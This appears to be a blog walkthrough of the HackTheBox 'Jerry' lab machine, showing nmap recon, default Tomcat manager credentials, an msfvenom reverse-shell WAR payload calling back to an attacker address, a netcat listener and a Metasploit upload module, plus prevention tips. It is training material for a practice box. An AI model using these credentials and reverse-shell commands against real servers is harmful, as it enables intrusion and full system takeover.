---
title: "Jerry - HackTheBox Walkthrough"
date: 2025-11-17 01:00:00 +0000
categories: [HackTheBox, Easy]
tags: [htb, windows, tomcat, default-credentials, war-upload]
pin: false
math: false
mermaid: false
---

## Box Info

- **Name:** Jerry
- **OS:** Windows
- **Difficulty:** Easy
- **IP:** 10.10.10.95
- **Release Date:** June 2018

## Summary

Jerry is an easy Windows box featuring an Apache Tomcat server with default credentials. By exploiting the manager interface with known credentials, we can upload a malicious WAR file to gain immediate SYSTEM-level access.

## Reconnaissance

### Nmap Scan

```bash
sudo nmap -sC -sV -oN Jerry.nmap 10.10.10.95
```

**Results:**
- **Port 8080** - Apache Tomcat 7.0.88

A full TCP scan confirms no additional ports are open:

```bash
nmap -p- --min-rate=1000 10.10.10.95
```

### Service Analysis

- Single attack surface: Tomcat web server
- Version 7.0.88 is vulnerable to authenticated code execution
- Manager interface accessible at `/manager/html`

## Enumeration

### Tomcat Manager Access

Navigate to:
```
http://10.10.10.95:8080/manager/html
```

The browser prompts for credentials. Testing default Tomcat credentials:

| Username | Password | Result |
|----------|----------|--------|
| tomcat   | tomcat   | Failed |
| admin    | admin    | Failed |
| tomcat   | s3cret   | **Success** |

Default credentials work: `tomcat:s3cret`

## Exploitation

### Method 1: Manual WAR Upload

1. **Generate reverse shell payload:**

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

2. **Start listener:**

```bash
nc -lvnp 4444
```

3. **Deploy WAR file:**
   - Login to Tomcat Manager with `tomcat:s3cret`
   - Scroll to "WAR file to deploy" section
   - Click "Browse" and select `shell.war`
   - Click "Deploy"

4. **Trigger payload:**

```
http://10.10.10.95:8080/shell/
```

**Result:** Reverse shell with NT Authority\SYSTEM privileges!

### Method 2: Metasploit

```bash
msfconsole
use exploit/multi/http/tomcat_mgr_upload
set PAYLOAD java/meterpreter/reverse_tcp
set LHOST 10.10.14.5
set RHOSTS 10.10.10.95
set HTTPUSERNAME tomcat
set HTTPPASSWORD s3cret
set RPORT 8080
exploit
```

## Privilege Escalation

**Not required!**

The Tomcat service runs as NT Authority\SYSTEM, giving us the highest Windows privilege level immediately upon exploitation.

```
C:\apache-tomcat-7.0.88>whoami
nt authority\system
```

## Flags

Both user and root flags are located in the same directory:

```
C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt
```

```bash
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

## Key Takeaways

1. **Default Credentials** - Always test common/default credentials on known services
2. **Service Identification** - Tomcat version revealed attack vector
3. **WAR File Upload** - Standard Tomcat exploitation technique
4. **Privilege Configuration** - Services running as SYSTEM = instant win

## Tools Used

- nmap - Port scanning and service detection
- msfvenom - Payload generation
- netcat - Reverse shell listener
- Metasploit (optional) - Automated exploitation

## Prevention

- Change default credentials immediately after installation
- Restrict manager interface access (IP whitelist)
- Run Tomcat with least-privilege service account
- Keep Tomcat updated to latest version
- Monitor for unauthorized WAR deployments

---

*Difficulty: Easy*
*Time to root: ~15 minutes*
*Key vulnerability: Default credentials + authenticated WAR upload*

